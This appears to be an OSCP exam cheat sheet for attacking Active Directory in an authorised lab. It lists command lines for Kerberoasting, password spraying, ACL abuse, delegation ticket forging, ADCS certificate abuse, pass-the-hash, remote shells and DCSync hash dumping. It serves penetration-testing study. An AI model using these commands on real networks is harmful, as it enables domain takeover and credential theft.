@@ -1,0 +1,559 @@
+
+> <b>Purpose:</b> the whole AD exam set on one page — from the provided credential to Domain Admin — in the order you actually use it.
+
+## Method summary
+
+<table header-row="true">
+<colgroup>
+<col width="168" />
+<col width="261.734375" />
+<col width="97" />
+</colgroup>
+<tr>
+<td>
+Objective
+</td>
+<td>
+Technique
+</td>
+<td>
+Section
+</td>
+</tr>
+<tr>
+<td>
+Map the domain
+</td>
+<td>
+SMB/LDAP enumeration, SRV records
+</td>
+<td>
+1-2
+</td>
+</tr>
+<tr>
+<td>
+Find weak credentials
+</td>
+<td>
+AS-REP roast, Kerberoast, spraying
+</td>
+<td>
+3
+</td>
+</tr>
+<tr>
+<td>
+Find the path
+</td>
+<td>
+BloodHound
+</td>
+<td>
+4
+</td>
+</tr>
+<tr>
+<td>
+Move sideways
+</td>
+<td>
+ACL abuse, delegation, local admin
+</td>
+<td>
+5-6
+</td>
+</tr>
+<tr>
+<td>
+Escalate to DA
+</td>
+<td>
+ADCS, DCSync
+</td>
+<td>
+7, 9
+</td>
+</tr>
+<tr>
+<td>
+Reach each machine
+</td>
+<td>
+WinRM, SMB exec, RDP
+</td>
+<td>
+8
+</td>
+</tr>
+</table>
+
+<b>Priority:</b> Core / Conditional / Advanced. <b>Status:</b> <b>Lab Tested</b> = executed against an authorised lab target · <b>Simulated</b> = exercised with simulated output or fixtures · <b>Syntax Checked</b> = flags checked against the installed tool here · <b>Environment Dependent</b> = needs a specific tool, version or host configuration · <b>Documented</b> = standard technique, not run here.
+
+## Assumptions and scope
+
+- The exam AD set provides a <b>username and password</b> — you start authenticated, not from a port scan.
+- All three machines in the set are in scope once you are working the set.
+- <b>Clock skew breaks Kerberos.</b> Sync before blaming a credential.
+- Metasploit modules are limited to <b>one</b> machine across the whole exam; assume AD work must be done with Impacket, NetExec and native tools.
+
+## 1. Confirm the domain
+
+### Step 01 — Identify the DC and the domain
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985 <DOMAIN_CONTROLLER_IP>
+nxc smb <DOMAIN_CONTROLLER_IP>
+dig @<DOMAIN_CONTROLLER_IP> _ldap._tcp.<DOMAIN> SRV +short
+```
+
+<b>Look for:</b> hostname, domain (in the SMB banner and SRV answer), <code>signing: required</code> on a DC.<br /><b>Decision:</b> domain name confirmed → Step 02. Kerberos (88) closed → some attacks are unavailable; stick to NTLM/LDAP.<br /><b>Next:</b> Step 02.<br /><b>Common mistake:</b> scanning the whole /24 before reading the credential sheet. In the AD set the DC is usually the first host you are pointed at.<br /><b>Evidence:</b> the banner and the SRV answer.
+
+### Step 02 — Make names resolve
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+echo "<DOMAIN_CONTROLLER_IP> <DOMAIN> <DC_HOSTNAME>.<DOMAIN> <DC_HOSTNAME>" | sudo tee -a /etc/hosts
+getent hosts <DOMAIN>
+```
+
+<b>Look for:</b> <code>getent</code> returning the DC address.<br /><b>Decision:</b> resolution works → Kerberos tools can use hostnames. Not resolving → every <code>getST</code>/<code>-k</code> command will fail with confusing errors.<br /><b>Next:</b> Step 03.<br /><b>Common mistake:</b> adding only the short name. Kerberos service tickets use the FQDN.<br /><b>Evidence:</b> the <code>/etc/hosts</code> line.
+
+### Step 02a — Unauthenticated AD sweep (no credentials)
+
+<b>Priority:</b> Conditional · <b>Run on:</b> Kali · <b>Status:</b> Documented
+
+```bash
+enum4linux-ng -A <DOMAIN_CONTROLLER_IP>
+```
+
+<b>Look for:</b> domain name, DC hostname, OS build, user and group lists, shares, and the password policy — all without a credential.<br /><b>Decision:</b> a user list appears → Step 08 (AS-REP) or Step 12 (username enumeration). Policy shown → respect the lockout threshold in Step 11. Access denied → the DC blocks null sessions; continue with a credential at Step 03.<br /><b>Next:</b> Step 08 or Step 12.<br /><b>Common mistake:</b> treating the output as a complete user list. It is limited by null-session policy — cross-check with <code>kerbrute userenum</code> (Step 12).<br /><b>Evidence:</b> the domain, policy, and user list it returned.
+
+## 2. Enumerate with the provided credential
+
+### Step 03 — One-pass domain sweep
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+nxc smb <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> --users --groups --shares --loggedon-users --pass-pol
+```
+
+<b>Look for:</b> <code>[+]</code> auth success, the user list, group membership, active sessions, and <b>lockout threshold</b>.<br /><b>Decision:</b> <code>(Pwn3d!)</code> → local admin, jump to Step 22. Valid but unprivileged → Step 04.<br /><b>Next:</b> Step 04.<br /><b>Common mistake:</b> running <code>--users</code> before reading <code>--pass-pol</code>. Know the lockout count before you touch a password.<br /><b>Evidence:</b> the auth line (user@domain on host), user list, policy.
+
+### Step 04 — Collect BloodHound data
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+nxc ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> --bloodhound -c All --dns-server <DOMAIN_CONTROLLER_IP>
+```
+
+<b>Look for:</b> a <code>.zip</code> written to the current directory, one per collection.<br /><b>Decision:</b> collection succeeds → Step 13. LDAP denied → try <code>bloodhound-python</code> (Step 05).<br /><b>Next:</b> Step 13.<br /><b>Common mistake:</b> leaving <code>--dns-server</code> off an internal domain — collection resolves nothing and produces a thin graph.<br /><b>Evidence:</b> the zip file and the time it was collected.
+
+### Step 05 — BloodHound from Python (fallback)
+
+<b>Priority:</b> Conditional · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -ns <DOMAIN_CONTROLLER_IP> -c All
+```
+
+<b>Look for:</b> <code>Compressing output into ...zip</code>.<br /><b>Decision:</b> zip produced → Step 13. Errors about DNS → check Step 02.<br /><b>Next:</b> Step 13.<br /><b>Common mistake:</b> running it without <code>-ns</code>, which sends queries to your resolver instead of the DC.<br /><b>Evidence:</b> the zip.
+
+### Step 06 — Raw LDAP query
+
+<b>Priority:</b> Conditional · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+ldapsearch -x -H ldap://<DOMAIN_CONTROLLER_IP> -D '<USERNAME>@<DOMAIN>' -w '<PASSWORD>' -b 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>' '(objectClass=user)' sAMAccountName description
+
+# same query through NetExec (compact output)
+nxc ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> --query "(objectClass=user)" "sAMAccountName,description,memberOf"
+```
+
+<b>Look for:</b> accounts with <code>description</code> fields holding passwords (a classic lab shortcut), and service-looking names.<br /><b>Decision:</b> a password in a description → validate it immediately (Step 11 constraints apply).<br /><b>Next:</b> Step 12 if the password works.<br /><b>Common mistake:</b> forgetting to convert <code>corp.local</code> into <code>DC=corp,DC=local</code> in the base DN.<br /><b>Evidence:</b> the entry containing the credential.
+
+### Step 07 — Read the password policy
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+nxc smb <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> --pass-pol
+```
+
+<b>Look for:</b> <code>Lockout threshold</code>, <code>Lockout duration</code>, <code>Minimum password length</code>, <code>Password history</code>.<br /><b>Decision:</b> threshold 0 = no lockout (spray freely but quietly). Threshold 3-5 → spray at most one password across all users, then stop.<br /><b>Next:</b> Step 11.<br /><b>Common mistake:</b> interpreting a lockout duration of 30 minutes as "safe to retry". It is not — the counter resets on success only if configured that way.<br /><b>Evidence:</b> the policy table, quoted in the report if you spray.
+
+## 3. Credential attacks
+
+### Step 08 — AS-REP roasting
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+# with a credential
+impacket-GetNPUsers <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <DOMAIN_CONTROLLER_IP> -request -outputfile <OUTPUT_FILE>
+# without any credential
+impacket-GetNPUsers <DOMAIN>/ -dc-ip <DOMAIN_CONTROLLER_IP> -usersfile <USERLIST> -no-pass -format hashcat -outputfile <OUTPUT_FILE>
+```
+
+<b>Look for:</b> <code>$krb5asrep$23$...</code> hashes written to the file.<br /><b>Decision:</b> hashes found → Step 10. Empty → no account has pre-authentication disabled; normal.<br /><b>Next:</b> Step 10.<br /><b>Common mistake:</b> using <code>-request</code> with <code>-no-pass</code> and no user list — the tool has nobody to ask about.<br /><b>Evidence:</b> the hash file (redact the hash in the report, keep the account name).
+
+### Step 09 — Kerberoasting
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+impacket-GetUserSPNs <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <DOMAIN_CONTROLLER_IP> -request -outputfile <OUTPUT_FILE>
+```
+
+<b>Look for:</b> service accounts with SPNs and <code>$krb5tgs$23$...</code> hashes.<br /><b>Decision:</b> a service account with an SPN and a weak password is the classic path. Hash obtained → Step 10.<br /><b>Next:</b> Step 10.<br /><b>Common mistake:</b> roasting an account that is already Domain Admin, cracking it, and then not checking whether its password works elsewhere.<br /><b>Evidence:</b> the SPN list and the hash file.
+
+### Step 10 — Crack offline
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+hashcat -m 18200 <OUTPUT_FILE> <WORDLIST>      # AS-REP
+hashcat -m 13100 <OUTPUT_FILE> <WORDLIST>      # Kerberoast (RC4)
+hashcat -m 19700 <OUTPUT_FILE> <WORDLIST>      # Kerberoast (AES)
+hashcat -m 18200 <OUTPUT_FILE> --show
+```
+
+<b>Look for:</b> <code>...:password</code> on the <code>--show</code> line.<br /><b>Decision:</b> cracked → validate on SMB/WinRM (Step 11 order). Not cracked → move to ACL pathfinding (Step 13); do not burn an hour on a wordlist.<br /><b>Next:</b> Step 11 or Step 13.<br /><b>Common mistake:</b> using mode 13100 on an AES ticket — it will never crack. Check the hash prefix.<br /><b>Evidence:</b> the recovered password and which account it belongs to.
+
+### Step 11 — Spray with the policy in mind
+
+<b>Priority:</b> Conditional · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+nxc smb <DOMAIN_CONTROLLER_IP> -u <USERLIST> -p '<PASSWORD>' -d <DOMAIN> --continue-on-success
+```
+
+<b>Look for:</b> <code>[+]</code> lines with <code>(Pwn3d!)</code> or plain success.<br /><b>Decision:</b> stop at the lockout threshold minus one. One password across many users is a spray; many passwords against one user is an attack that locks the account.<br /><b>Next:</b> re-enumerate with any new identity (Step 03).<br /><b>Common mistake:</b> spraying a password derived from the season/year without checking complexity policy first.<br /><b>Evidence:</b> which users succeeded, and the policy that made it safe.
+
+### Step 12 — Username enumeration without credentials
+
+<b>Priority:</b> Conditional · <b>Run on:</b> Kali · <b>Status:</b> Documented
+
+```bash
+kerbrute userenum -d <DOMAIN> --dc <DOMAIN_CONTROLLER_IP> <USERLIST>
+```
+
+<b>Look for:</b> <code>VALID USERNAME</code> lines.<br /><b>Decision:</b> valid names → Step 08 (<code>-no-pass</code>) and Step 11.<br /><b>Next:</b> Step 08.<br /><b>Common mistake:</b> a huge wordlist against Kerberos triggers alerts and takes hours; use a targeted list built from the domain naming convention.<br /><b>Evidence:</b> the valid-name list.
+
+## 4. Read BloodHound
+
+### Step 13 — Load and query
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Documented
+
+1. <code>sudo neo4j start</code>, then open BloodHound and log in.
+2. Upload the zip from Step 04/05 (drag into the UI).
+3. Mark your owned users/computers as <b>Owned</b>.
+4. Run the built-in queries, in this order:
+   - <b>Shortest Paths to Domain Admins from Owned Principals</b>
+   - <b>Find Principals with DCSync Rights</b>
+   - <b>List all Kerberoastable Accounts</b>
+   - <b>Find AS-REP Roastable Users</b>
+   - <b>Find Computers with Unconstrained Delegation</b>
+   - <b>Shortest Paths to Unconstrained Delegation Systems</b>
+
+<b>Look for:</b> a path of 2-4 edges ending at a group or a machine you can reach. The shortest path is usually the intended one.<br /><b>Decision:</b> edge is an ACL → Step 14. Delegation → Step 16-18. ADCS → Step 19.<br /><b>Next:</b> the section the edge points to.<br /><b>Common mistake:</b> staring at the graph instead of the query list. The prebuilt queries answer most exam questions in one click.<br /><b>Evidence:</b> a screenshot of the path, with the edge labels visible.
+
+## 5. ACL abuse
+
+### Step 14 — Match the edge to the tool
+
+<table header-row="true">
+<colgroup>
+<col width="203.375" />
+<col width="353" />
+<col width="216" />
+</colgroup>
+<tr>
+<td>
+BloodHound edge
+</td>
+<td>
+What it lets you do
+</td>
+<td>
+Tool
+</td>
+</tr>
+<tr>
+<td>
+<code>ForceChangePassword</code>
+</td>
+<td>
+Set the target's password without knowing it
+</td>
+<td>
+<code>net rpc password</code>
+</td>
+</tr>
+<tr>
+<td>
+<code>GenericAll</code> on a user
+</td>
+<td>
+Reset password, or targeted Kerberoast
+</td>
+<td>
+<code>net rpc password</code> / <code>bloodyAD</code>
+</td>
+</tr>
+<tr>
+<td>
+<code>GenericWrite</code> on a user
+</td>
+<td>
+Write <code>servicePrincipalName</code> → targeted Kerberoast
+</td>
+<td>
+<code>bloodyAD</code>
+</td>
+</tr>
+<tr>
+<td>
+<code>AddMember</code>
+</td>
+<td>
+Add yourself to a privileged group
+</td>
+<td>
+<code>net rpc group addmem</code>
+</td>
+</tr>
+<tr>
+<td>
+<code>WriteDACL</code>
+</td>
+<td>
+Grant yourself FullControl, then abuse it
+</td>
+<td>
+<code>impacket-dacledit</code>
+</td>
+</tr>
+<tr>
+<td>
+<code>WriteOwner</code>
+</td>
+<td>
+Take ownership, then change the DACL
+</td>
+<td>
+<code>impacket-owneredit</code>
+</td>
+</tr>
+<tr>
+<td>
+<code>GenericAll</code> on a computer
+</td>
+<td>
+RBCD
+</td>
+<td>
+Step 18
+</td>
+</tr>
+</table>
+
+### Step 15 — Execute the ACL abuse
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+# ForceChangePassword / GenericAll on a user
+net rpc password '<TARGET_USER>' '<NEW_PASSWORD>' -U '<DOMAIN>/<USERNAME>%<PASSWORD>' -S <DOMAIN_CONTROLLER_IP>
+
+# AddMember
+net rpc group addmem '<TARGET_GROUP>' '<USERNAME>' -U '<DOMAIN>/<USERNAME>%<PASSWORD>' -S <DOMAIN_CONTROLLER_IP>
+
+# WriteDACL -> give yourself FullControl
+impacket-dacledit -action write -rights FullControl -principal <USERNAME> -target <TARGET_ACCOUNT> -dc-ip <DOMAIN_CONTROLLER_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+
+# WriteOwner
+impacket-owneredit -action write -new-owner <USERNAME> -target <TARGET_ACCOUNT> -dc-ip <DOMAIN_CONTROLLER_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+```
+
+<b>Look for:</b> <code>password changed</code>, <code>DACL modified</code>, or a group membership confirmation.<br /><b>Decision:</b> password reset → authenticate as the target and re-run Step 03. DACL written → repeat the abuse you just granted yourself.<br /><b>Next:</b> Step 03 with the new identity.<br /><b>Common mistake:</b> changing a password on an account that is already in use by a service — you break the box and lose points. Prefer targeted Kerberoast where possible.<br /><b>Evidence:</b> the command and its confirmation, plus the new access it produced.
+
+> <code>bloodyAD</code> is the cleanest tool for targeted Kerberoast (<code>set object <TARGET> servicePrincipalName -v 'http/fake'</code>), but it is <b>not installed here</b>. Install with <code>pipx install bloodyAD</code> before relying on it.
+
+## 6. Delegation
+
+### Step 16 — Unconstrained delegation
+
+<b>Priority:</b> Advanced · <b>Run on:</b> Kali · <b>Status:</b> Documented
+
+```bash
+nxc ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> --query "(userAccountControl:1.2.840.113556.1.4.803:=524288)" "sAMAccountName"
+```
+
+<b>Look for:</b> computer accounts trusted for delegation (often the DC itself — that is expected).<br /><b>Decision:</b> a <b>non-DC</b> host with unconstrained delegation → coerce an admin to authenticate to it (PrinterBug / PetitPotam / Coercer), capture the ticket, then pass-the-ticket.<br /><b>Next:</b> coercion tooling of your choice; validate it exists on your Kali build first.<br /><b>Common mistake:</b> coercing the DC into itself — the resulting ticket is useless for escalation.<br /><b>Evidence:</b> the delegation flag, the coercion command, and the captured ticket.
+
+### Step 17 — Constrained delegation
+
+<b>Priority:</b> Advanced · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+impacket-getST -spn <SERVICE>/<TARGET_HOST> -impersonate Administrator -dc-ip <DOMAIN_CONTROLLER_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+export KRB5CCNAME=<USERNAME>.ccache
+```
+
+<b>Look for:</b> a <code>.ccache</code> written for the impersonated user.<br /><b>Decision:</b> ticket obtained → use <code>-k -no-pass</code> with Impacket against the allowed SPN only.<br /><b>Next:</b> use the ticket (Step 21).<br /><b>Common mistake:</b> requesting an SPN the account is not allowed to delegate to — the KDC refuses, and the error does not say why.<br /><b>Evidence:</b> <code>msDS-AllowedToDelegateTo</code> and the ticket request.
+
+### Step 18 — Resource-based constrained delegation (RBCD)
+
+<b>Priority:</b> Advanced · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+impacket-addcomputer -computer-name 'FAKE$' -computer-pass '<NEW_PASSWORD>' -dc-ip <DOMAIN_CONTROLLER_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+impacket-rbcd -delegate-from 'FAKE$' -delegate-to '<TARGET_COMPUTER$>' -action write -dc-ip <DOMAIN_CONTROLLER_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+impacket-getST -spn cifs/<TARGET_HOST> -impersonate Administrator -dc-ip <DOMAIN_CONTROLLER_IP> '<DOMAIN>/FAKE$:<NEW_PASSWORD>'
+```
+
+<b>Look for:</b> the RBCD write succeeding, then a service ticket for Administrator.<br /><b>Decision:</b> <code>addcomputer</code> denied (<code>MachineAccountQuota = 0</code>) → RBCD needs an existing computer account you control.<br /><b>Next:</b> Step 21 with the ticket.<br /><b>Common mistake:</b> forgetting the trailing <code>$</code> on computer names — they are machine accounts, not users.<br /><b>Evidence:</b> the RBCD attribute before/after, and the ticket.
+
+## 7. ADCS
+
+### Step 19 — Find vulnerable templates
+
+<b>Priority:</b> Conditional · <b>Run on:</b> Kali · <b>Status:</b> Environment Dependent
+
+```bash
+certipy find -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DOMAIN_CONTROLLER_IP> -vulnerable -stdout
+```
+
+<b>Prerequisites:</b> <code>certipy</code> comes from the PyPI package <code>certipy-ad</code> (<code>pipx install certipy-ad</code>) — the executable is still <code>certipy</code>. It is <b>not</b> installed on the build host used for this audit, and its flags changed between v4 and v5: run <code>certipy -h</code> on your install before trusting the line above.
+
+<b>Look for:</b> ESC1 (enrollee supplies subject), ESC8 (HTTP enrollment + relay), ESC4 (writable template).<br /><b>Decision:</b> a vulnerable template you can enrol in → Step 20. ESC8 → relay to the CA (Advanced, needs coercion).<br /><b>Next:</b> Step 20.<br /><b>Common mistake:</b> <code>certipy</code> is <b>not installed</b> on this machine — <code>pipx install certipy-ad</code> first, and expect version-dependent flags.<br /><b>Evidence:</b> the vulnerable template name and the ESC number.
+
+### Step 20 — Request a certificate as Administrator
+
+<b>Priority:</b> Advanced · <b>Run on:</b> Kali · <b>Status:</b> Environment Dependent
+
+```bash
+certipy req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'administrator@<DOMAIN>' -dc-ip <DOMAIN_CONTROLLER_IP>
+certipy auth -pfx administrator.pfx -dc-ip <DOMAIN_CONTROLLER_IP>
+```
+
+<b>Prerequisites:</b> the same <code>certipy-ad</code> install as Step 19 (<b>not</b> installed on the build host used for this audit), plus the CA name and template from Step 19. In certipy v5 the <code>req</code>/<code>auth</code> flow moved its output files, so read <code>certipy -h</code> and the <code>.pfx</code> path it reports rather than assuming <code>administrator.pfx</code>.
+
+<b>Look for:</b> a <code>.pfx</code> and then an NT hash from <code>auth</code>.<br /><b>Decision:</b> hash returned → pass-the-hash (Step 22) or DCSync (Step 23).<br /><b>Next:</b> Step 23.<br /><b>Common mistake:</b> requesting the certificate before checking that the template allows the UPN you need.<br /><b>Evidence:</b> the issued certificate, and the NT hash it produced.
+
+## 8. Lateral movement
+
+### Step 21 — Reach the next machine
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+nxc winrm <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN>
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p '<PASSWORD>'
+impacket-wmiexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>'
+impacket-psexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>'
+```
+
+<b>Look for:</b> <code>(Pwn3d!)</code> on WinRM, or a shell prompt from Impacket.<br /><b>Decision:</b> WinRM open and admin → <code>evil-winrm</code> is the most stable shell. SMB only → <code>wmiexec</code> (quieter than <code>psexec</code>).<br /><b>Next:</b> local enumeration on the host, then Step 23 if you are admin on the DC.<br /><b>Common mistake:</b> <code>psexec</code> drops a service binary and is noisy; it can also fail on hardened hosts. Try <code>wmiexec</code> first.<br /><b>Evidence:</b> the shell prompt plus <code>whoami /priv</code>.
+
+### Step 22 — Pass-the-hash
+
+<b>Priority:</b> Conditional · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+nxc smb <TARGET_IP> -u <USERNAME> -H '<NTHASH>' -d <DOMAIN>
+evil-winrm -i <TARGET_IP> -u <USERNAME> -H '<NTHASH>'
+```
+
+<b>Look for:</b> <code>[+]</code> auth success without a plaintext password.<br /><b>Decision:</b> hash works → same access as the password would give.<br /><b>Next:</b> Step 21.<br /><b>Common mistake:</b> passing an LM hash, or the NT hash of a machine account you have not yet found a use for.<br /><b>Evidence:</b> the auth success line and where the hash came from.
+
+## 9. Domain compromise
+
+### Step 23 — DCSync
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+impacket-secretsdump '<DOMAIN>/<USERNAME>:<PASSWORD>@<DOMAIN_CONTROLLER_IP>' -just-dc-ntlm
+nxc smb <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> --ntds
+```
+
+<b>Look for:</b> <code>krbtgt</code> and <code>Administrator</code> NTLM hashes.<br /><b>Decision:</b> hashes returned → pass-the-hash as Administrator (Step 22) and prove access on each set machine.<br /><b>Next:</b> capture proof on all three machines.<br /><b>Common mistake:</b> running <code>--ntds</code> on a host that is not the DC, or with an account holding DCSync rights but no local admin (use <code>secretsdump</code> directly against the DC instead).<br /><b>Evidence:</b> the hash dump (redacted in the report), and the Administrator shell on each machine.
+
+### Step 24 — Prove each machine
+
+<b>Priority:</b> Core · <b>Run on:</b> each target · <b>Status:</b> Syntax Checked
+
+```bash
+# Windows proof
+type C:\Users\Administrator\Desktop\proof.txt
+ipconfig
+```
+
+<b>Look for:</b> proof contents plus the target IP in the same screenshot.<br /><b>Decision:</b> proof missing → you do not have the admin level the report needs.<br /><b>Next:</b> submit in the control panel.<br /><b>Common mistake:</b> reading the proof through a web shell or a non-interactive channel — that scores zero.<br /><b>Evidence:</b> one screenshot per machine, IP visible.
+
+## 10. Troubleshooting
+
+| Error | Meaning | Fix |
+| --- | --- | --- |
+| <code>KRB_AP_ERR_SKEW</code> / <code>Clock skew too great</code> | Kali clock differs from the DC | <code>sudo ntpdate <DOMAIN_CONTROLLER_IP></code> (install ntpdate) |
+| <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code> | Username wrong or realm wrong | Use <code><DOMAIN>\<USERNAME></code> or <code><USERNAME>@<DOMAIN></code> |
+| <code>KDC_ERR_ETYPE_NOTSUPP</code> | RC4 disabled on the account | Try AES, or request a different ticket type |
+| <code>STATUS_LOGON_FAILURE</code> | Bad password, or local vs domain | Add <code>-d <DOMAIN></code>; try <code>--local-auth</code> for local accounts |
+| <code>LDAP signing required</code> | Channel binding enforced | Use LDAPS (<code>:636</code>) or a supported relay |
+| <code>getST</code> returns nothing | SPN not allowed / no delegation | Re-check the delegation attributes |
+| BloodHound graph nearly empty | Collection ran without <code>--dns-server</code>/ <code>-ns</code> | Re-collect (Step 04/05) |
+| <code>addcomputer</code> denied | <code>MachineAccountQuota = 0</code> | RBCD needs a computer you already control |
+
+<b>Stop condition:</b> if you hold DA on the DC and every set machine answers to the Administrator hash, stop attacking and start documenting. Extra persistence earns nothing and risks the report.
+
+## 11. Quick workflow
+
+1. <code>nmap</code> the DC ports → <code>nxc smb</code> banner → domain name.
+2. <code>/etc/hosts</code> entries for domain + DC FQDN.
+3. <code>nxc smb --users --groups --shares --loggedon-users --pass-pol</code>.
+4. <code>nxc ldap --bloodhound -c All --dns-server <DC></code>.
+5. AS-REP roast + Kerberoast → <code>hashcat</code>.
+6. Spray one password if the policy allows.
+7. BloodHound: shortest path from Owned.
+8. Follow the edge: ACL → delegation → ADCS.
+9. Lateral movement → local admin → DCSync.
+10. Proof on each machine → control panel.
+
+## 12. Evidence to preserve
+
+- The credential you were given, and every credential you derived (with its source).
+- The password policy <b>before</b> any spraying.
+- The BloodHound path screenshot with edge labels.
+- The exact command and output for each privilege boundary you crossed.
+- The DC hash dump, redacted, as proof of domain compromise.
+
+## 13. Related pages
+
+- <mention url="https://app.notion.com/p/4011e51238b581bbadcbe10d66d5ce31" /> — share and session enumeration
+- <mention url="https://app.notion.com/p/4011e51238b581b49f33e6d71a304549" /> — SRV records that locate the DC
+- <mention url="https://app.notion.com/p/4011e51238b581669e09d615530aa92a" /> — DC port set
+- [OSCP Attack Workflow — Start Here](https://app.notion.com/p/4011e51238b581c5ad53c7704de0ebc5)
+- [OSCP Exam Rules & Tool Restrictions](https://app.notion.com/p/4011e51238b5812ab0e1f4ed40981967) — Metasploit and tool limits
+- NetExec — Complete Command Reference <i>(batch 4)</i>
+- Impacket — Complete Command Reference <i>(batch 4)</i>
+- BloodHound — Complete Command Reference <i>(batch 4)</i>
+
+## 14. References
+
+- Impacket examples: [https://github.com/fortra/impacket/tree/master/examples](https://github.com/fortra/impacket/tree/master/examples)
+- NetExec wiki: [https://www.netexec.wiki/](https://www.netexec.wiki/)
+- BloodHound documentation: [https://bloodhound.readthedocs.io/](https://bloodhound.readthedocs.io/)
+- Certipy: [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
+- ADCS attack paths (ESC1-ESC8): [https://posts.specterops.io/certified-pre-owned-d95910965cd2](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
+
+## 15. Verification note
+
+Impacket flags (<code>-usersfile</code>, <code>-format</code>, <code>-no-pass</code>, <code>-dc-ip</code>, <code>-outputfile</code>, <code>-request</code>, <code>-action</code>, <code>-rights</code>, <code>-principal</code>, <code>-target</code>, <code>-new-owner</code>, <code>-delegate-from</code>, <code>-delegate-to</code>, <code>-spn</code>, <code>-impersonate</code>, <code>-computer-name</code>, <code>-computer-pass</code>) and NetExec's <code>--bloodhound</code>/<code>--dns-server</code>/<code>--query</code> were checked against the installed binaries. <b>certipy and bloodyAD are not installed here</b> — their commands are documented from their published usage and are <b>Environment Dependent</b>. No AD environment was attacked for this page; nothing is <b>Lab Tested</b>.
